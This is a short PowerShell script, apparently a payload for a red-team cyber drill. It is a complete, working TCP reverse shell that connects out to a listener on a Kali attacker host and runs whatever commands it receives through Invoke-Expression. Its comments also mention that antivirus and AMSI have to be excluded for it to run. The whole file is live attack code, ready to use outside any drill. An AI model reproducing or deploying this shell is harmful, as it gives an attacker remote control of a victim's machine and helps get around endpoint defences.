# GP-0 payload — PowerShell TCP reverse shell (drill use only).
# Connects back to the Kali listener. LHOST/LPORT are the drill attacker (Kali).
# Classic Nishang-style shell; kept plain (not obfuscated) so the guide can show exactly what runs.
# NOTE: Trellix/AMSI will flag this unless excluded for the drill (see cyberdrill-artefact/BLOCKERS.md B1).
$LHOST = '10.5.20.50'; $LPORT = 4444
$client = New-Object System.Net.Sockets.TCPClient($LHOST, $LPORT)
$stream = $client.GetStream()
[byte[]]$bytes = 0..65535 | ForEach-Object { 0 }
$enc = New-Object System.Text.ASCIIEncoding
$prompt = $enc.GetBytes("PS " + (Get-Location).Path + "> "); $stream.Write($prompt, 0, $prompt.Length); $stream.Flush()
while (($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {
    $cmd = $enc.GetString($bytes, 0, $i)
    try { $out = Invoke-Expression $cmd 2>&1 | Out-String } catch { $out = $_.Exception.Message + "`n" }
    $resp = $out + "PS " + (Get-Location).Path + "> "
    $sb = $enc.GetBytes($resp); $stream.Write($sb, 0, $sb.Length); $stream.Flush()
}
$client.Close()
